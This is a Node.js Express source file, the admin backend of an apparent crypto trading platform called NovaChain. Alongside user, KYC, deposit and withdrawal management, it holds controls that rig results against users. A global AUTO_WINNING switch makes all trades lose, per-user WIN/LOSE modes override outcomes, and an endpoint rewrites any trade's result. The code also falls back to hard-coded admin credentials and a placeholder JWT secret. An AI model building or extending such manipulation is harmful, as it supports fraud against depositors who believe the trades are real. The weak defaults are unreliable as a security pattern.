// server.js (admin backend, Postgres/Supabase)
const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
require('dotenv').config();
const pool = require('./db'); // Use your new db.js here
const path = require('path');
const multer = require('multer');
const upload = multer({ dest: path.join(__dirname, '../../novachain-backend/uploads') });


const app = express();
const PORT = 5001;
const fs = require('fs');
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'admin@novachain.com';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'SuperSecret123';
const JWT_SECRET = process.env.JWT_SECRET || 'your_jwt_secret';

// Global admin trade control state (in-memory only)
const userAutoWin = {};    // For per-user WIN/LOSE overrides (object: { [userId]: "win"/"lose" })
let AUTO_WINNING = true;   // For global AUTO_WINNING mode (true = win by real movement, false = all lose)

const allowedOrigins = [
  'http://localhost:3000',
  'http://localhost:5173',
  'http://localhost:3001',
  'https://www.adminnovachain.link'
];

const corsOptions = {
  origin: function (origin, callback) {
    // Allow requests with no origin (like mobile apps, curl, etc.)
    if (!origin) return callback(null, true);
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    } else {
      return callback(new Error('CORS Not Allowed'));
    }
  },
  credentials: true,
};

app.use(cors(corsOptions));
app.use(express.json());
app.use('/uploads', express.static(path.join(__dirname, '../../novachain-backend/uploads')));

// JWT admin auth middleware
function requireAdminAuth(req, res, next) {
  const token = req.headers.authorization && req.headers.authorization.split(' ')[1];
  if (!token) return res.status(401).json({ message: 'No token provided' });
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    if (decoded.email !== ADMIN_EMAIL) throw new Error();
    next();
  } catch {
    res.status(401).json({ message: 'Invalid token' });
  }
}

// --- Admin Save Deposit Wallet Addresses (with QR upload) ---
app.post(
  '/api/admin/deposit-addresses',
  requireAdminAuth,
  upload.any(), // Accept file uploads
  async (req, res) => {
    try {
      console.log("BODY:", req.body);
      console.log("FILES:", req.files);
      // For each coin (USDT, BTC, etc): address, optional qr image
      const coins = ['USDT', 'BTC', 'ETH', 'TON', 'SOL', 'XRP'];
      let updated = 0;
      for (const coin of coins) {
        const address = req.body[`${coin}_address`] || '';
        let qr_url = null;

        // Find the uploaded QR image file (if present)
        const qrFile = (req.files || []).find(f => f.fieldname === `${coin}_qr`);
        if (qrFile) {
          qr_url = `/uploads/${qrFile.filename}`;
        }

        // Only upsert if address or qr provided
        if (address || qr_url) {
          await pool.query(
            `
            INSERT INTO deposit_addresses (coin, address, qr_url, updated_at)
            VALUES ($1, $2, $3, NOW())
            ON CONFLICT (coin)
            DO UPDATE SET address = $2, qr_url = COALESCE($3, deposit_addresses.qr_url), updated_at = NOW()
            `,
            [coin, address, qr_url]
          );
          updated++;
        }
      }
      if (!updated) {
        return res.status(400).json({ success: false, message: "No address or QR uploaded" });
      }
      res.json({ success: true, message: "Deposit wallet settings updated" });
    } catch (err) {
      console.error("Deposit address save error:", err);
      res.status(500).json({ success: false, message: "Failed to save deposit settings", detail: err.message });
    }
  }
);


// --- Fetch deposit addresses for frontend (public, no auth needed) ---
app.get('/api/admin/deposit-addresses', async (req, res) => {
  try {
    const result = await pool.query(`SELECT coin, address, qr_url FROM deposit_addresses`);
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ message: "Failed to fetch deposit addresses" });
  }
});

// Admin login (NO auth here)
app.post('/api/admin/login', (req, res) => {
  const { email, password } = req.body;
  if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
    return res.status(401).json({ message: 'Invalid email or password' });
  }
  const token = jwt.sign({ email }, JWT_SECRET, { expiresIn: '8h' });
  res.json({ token });
});

// --- Fetch users with current win/lose mode ---
app.get('/api/admin/users', requireAdminAuth, async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT 
        u.id, u.username, u.email, u.verified, u.kyc_status, u.kyc_selfie, u.kyc_id_card,
        COALESCE(tm.mode, 'DEFAULT') AS trade_mode
       FROM users u
       LEFT JOIN user_trade_modes tm ON u.id = tm.user_id
       ORDER BY u.id DESC`
    );
    res.json(result.rows);
  } catch (err) {
    console.error("❌ Failed to fetch users:", err.message);
    res.status(500).json({ message: 'Failed to fetch users' });
  }
});


// Delete a user by ID (including all their related data if needed)
app.delete('/api/admin/user/:id', requireAdminAuth, async (req, res) => {
  const { id } = req.params;
  const client = await pool.connect();
  try {
    // 1. Get KYC file names first (if you want to delete the files, you can use them)
    const { rows } = await client.query(
      `SELECT kyc_selfie, kyc_id_card FROM users WHERE id = $1`, [id]
    );
    const userRow = rows[0];

    await client.query('BEGIN');
    await client.query(`DELETE FROM wallets WHERE user_id = $1`, [id]);
    await client.query(`DELETE FROM user_balances WHERE user_id = $1`, [id]);
    await client.query(`DELETE FROM trades WHERE user_id = $1`, [id]);
    await client.query(`DELETE FROM deposits WHERE user_id = $1`, [id]);
    await client.query(`DELETE FROM withdrawals WHERE user_id = $1`, [id]);
    await client.query(`DELETE FROM users WHERE id = $1`, [id]);
    await client.query('COMMIT');

    // (OPTIONAL) Delete KYC files from disk here if needed

    res.json({ message: `User #${id} and all related data deleted.` });
  } catch (err) {
    await client.query('ROLLBACK');
    res.status(500).json({ message: 'Failed to delete user', detail: err.message });
  } finally {
    client.release();
  }
});


app.post('/api/admin/user-kyc-status', requireAdminAuth, async (req, res) => {
  const { user_id, kyc_status } = req.body;
  if (!user_id || !['approved', 'rejected', 'pending'].includes(kyc_status)) {
    return res.status(400).json({ message: "Invalid input" });
  }
  try {
    await pool.query(
      `UPDATE users SET kyc_status = $1 WHERE id = $2`,
      [kyc_status, user_id]
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ message: "DB error" });
  }
});

app.get('/api/admin/user/:id/kyc', requireAdminAuth, async (req, res) => {
  const { id } = req.params;
  try {
    const { rows } = await pool.query(
      `SELECT kyc_selfie, kyc_id_card, kyc_status FROM users WHERE id = $1`,
      [id]
    );
    const row = rows[0];
    if (!row) return res.status(404).json({ error: "User not found" });
    row.kyc_selfie = row.kyc_selfie ? `/uploads/${row.kyc_selfie}` : null;
    row.kyc_id_card = row.kyc_id_card ? `/uploads/${row.kyc_id_card}` : null;
    res.json(row);
  } catch (err) {
    res.status(500).json({ error: "DB error" });
  }
});


app.post('/api/admin/auto-winning', requireAdminAuth, (req, res) => {
  const { enabled } = req.body;
  if (typeof enabled !== 'boolean') {
    return res.status(400).json({ message: 'Invalid value for enabled' });
  }
  AUTO_WINNING = enabled;
  res.json({ message: `AUTO_WINNING set to ${AUTO_WINNING}` });
});

app.get('/api/admin/user-win-modes', requireAdminAuth, (req, res) => {
  res.json(userAutoWin);
});


app.get('/api/admin/trades', requireAdminAuth, async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT 
          t.id, 
          t.user_id,
          u.username,  -- pull username from users table
          t.direction AS type,
          t.amount,
          t.result,
          t.duration,
          t.timestamp AS created_at
       FROM trades t
       LEFT JOIN public.users u ON t.user_id = u.id
       ORDER BY t.id DESC`
    );
    res.json(result.rows);
  } catch (err) {
    console.error("Failed to fetch trades:", err.message);
    res.status(500).json({ message: 'Failed to fetch trades', detail: err.message });
  }
});


// Change user status (active/suspended)
app.post('/api/admin/user-status', requireAdminAuth, async (req, res) => {
  const { userId, newStatus } = req.body;
  if (!userId || !['active', 'suspended'].includes(newStatus)) {
    return res.status(400).json({ message: 'Invalid input' });
  }
  try {
    await pool.query(
      'UPDATE users SET status = $1 WHERE id = $2',
      [newStatus, userId]
    );
    res.json({ message: `User ${userId} status changed to ${newStatus}` });
  } catch (err) {
    res.status(500).json({ message: 'Failed to update status', detail: err.message });
  }
});

// Update a trade's result (Win/Loss)
app.post('/api/admin/update-trade', requireAdminAuth, async (req, res) => {
  const { tradeId, result } = req.body;
  if (!tradeId || !['Win', 'Loss'].includes(result)) {
    return res.status(400).json({ message: 'Invalid input' });
  }
  try {
    await pool.query(
      'UPDATE trades SET result = $1 WHERE id = $2',
      [result, tradeId]
    );
    res.json({ message: `Trade ${tradeId} updated to ${result}` });
  } catch (err) {
    res.status(500).json({ message: 'Failed to update trade', detail: err.message });
  }
});


// Approve a deposit by ID AND update user_balances table
app.post('/api/admin/deposits/:id/approve', requireAdminAuth, async (req, res) => {
  const { id } = req.params;
  try {
    // 1. Get deposit details
    const { rows } = await pool.query(
      'SELECT user_id, amount, coin FROM deposits WHERE id = $1',
      [id]
    );
    if (rows.length === 0) return res.status(404).json({ message: 'Deposit not found' });
    const deposit = rows[0];

    // 2. Approve deposit
    await pool.query(
      'UPDATE deposits SET status = $1 WHERE id = $2',
      ['approved', id]
    );

    // 3. Upsert into user_balances (add to balance if already exists)
    await pool.query(
      `
        INSERT INTO user_balances (user_id, coin, balance)
        VALUES ($1, $2, $3)
        ON CONFLICT (user_id, coin)
        DO UPDATE SET balance = user_balances.balance + EXCLUDED.balance
      `,
      [deposit.user_id, deposit.coin, deposit.amount]
    );

    res.json({ message: `Deposit #${id} approved and user_balances updated.` });
  } catch (err) {
    res.status(500).json({ message: 'Failed to approve deposit', detail: err.message });
  }
});

// Deny a deposit by ID
app.post('/api/admin/deposits/:id/deny', requireAdminAuth, async (req, res) => {
  const { id } = req.params;
  try {
    await pool.query(
      'UPDATE deposits SET status = $1 WHERE id = $2',
      ['denied', id]
    );
    res.json({ message: `Deposit #${id} denied.` });
  } catch (err) {
    res.status(500).json({ message: 'Failed to deny deposit', detail: err.message });
  }
});

// Approve a withdrawal by ID AND reduce user balance
app.post('/api/admin/withdrawals/:id/approve', requireAdminAuth, async (req, res) => {
  const { id } = req.params;
  try {
    // 1. Get withdrawal info
    const { rows } = await pool.query(
      'SELECT user_id, amount, coin FROM withdrawals WHERE id = $1',
      [id]
    );
    if (rows.length === 0) return res.status(404).json({ message: 'Withdrawal not found' });
    const wd = rows[0];

    // 2. Mark withdrawal as approved
    await pool.query(
      'UPDATE withdrawals SET status = $1 WHERE id = $2',
      ['approved', id]
    );

    // 3. Subtract amount from user's balance for the coin
    await pool.query(
      `UPDATE user_balances
       SET balance = balance - $1
       WHERE user_id = $2 AND coin = $3`,
      [wd.amount, wd.user_id, wd.coin]
    );

    res.json({ message: `Withdrawal #${id} approved and user balance reduced.` });
  } catch (err) {
    res.status(500).json({ message: 'Failed to approve withdrawal', detail: err.message });
  }
});

// Deny a withdrawal by ID
app.post('/api/admin/withdrawals/:id/deny', requireAdminAuth, async (req, res) => {
  const { id } = req.params;
  try {
    await pool.query(
      'UPDATE withdrawals SET status = $1 WHERE id = $2',
      ['denied', id]
    );
    res.json({ message: `Withdrawal #${id} denied.` });
  } catch (err) {
    res.status(500).json({ message: 'Failed to deny withdrawal', detail: err.message });
  }
});

app.get('/api/admin/deposits', requireAdminAuth, async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT id, user_id, coin, amount, address, screenshot, status, created_at
       FROM deposits ORDER BY id DESC`
    );
    // Attach the full image URL for frontend display
    const mappedRows = result.rows.map(row => ({
      ...row,
      screenshot_url: row.screenshot
        ? `http://localhost:5000/uploads/${row.screenshot}`
        : null
    }));
    res.json(mappedRows);
  } catch (err) {
    res.status(500).json({ message: 'Failed to fetch deposits', detail: err.message });
  }
});


// Get all withdrawals
app.get('/api/admin/withdrawals', requireAdminAuth, async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT id, user_id, amount, coin, status, address, created_at
       FROM withdrawals ORDER BY id DESC`
    );
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ message: 'Failed to fetch withdrawals', detail: err.message });
  }
});

// TEMPORARY DEBUG ROUTE - see columns in deposits table
app.get('/debug/deposits', requireAdminAuth, async (req, res) => {
  try {
    const result = await pool.query(`
      SELECT column_name, data_type, is_nullable
      FROM information_schema.columns
      WHERE table_name = 'deposits'
    `);
    res.json(result.rows);
  } catch (err) {
    res.json({ error: err.message });
  }
});


// Add this near your other routes
app.get('/debug/trades', requireAdminAuth, async (req, res) => {
  try {
    const result = await pool.query(`
      SELECT column_name, data_type, is_nullable
      FROM information_schema.columns
      WHERE table_name = 'trades'
    `);
    res.json(result.rows);
  } catch (err) {
    res.json({ error: err.message });
  }
});

// Add near your other routes
const axios = require('axios');


// Add THIS route to your admin backend!
app.post('/api/admin/users/:user_id/trade-mode', requireAdminAuth, async (req, res) => {
  const { user_id } = req.params;
  const { mode } = req.body;
  if (!user_id || !['WIN', 'LOSE', null, ""].includes(mode)) {
    return res.status(400).json({ message: 'Invalid input' });
  }
  try {
    // Forward the request to main backend API (user backend)
    const mainBackendURL = 'https://novachain-backend.onrender.com'; // <-- Set your REAL main backend URL here!
    const axiosRes = await axios.post(
      `${mainBackendURL}/api/admin/users/${user_id}/trade-mode`,
      { mode: mode || null }
    );
    res.json({ success: true, ...axiosRes.data });
  } catch (err) {
    res.status(500).json({ message: 'Failed to update user mode', detail: err.message });
  }
});



app.listen(PORT, () => {
  console.log(`NovaChain Admin Backend running on port ${PORT}`);
});
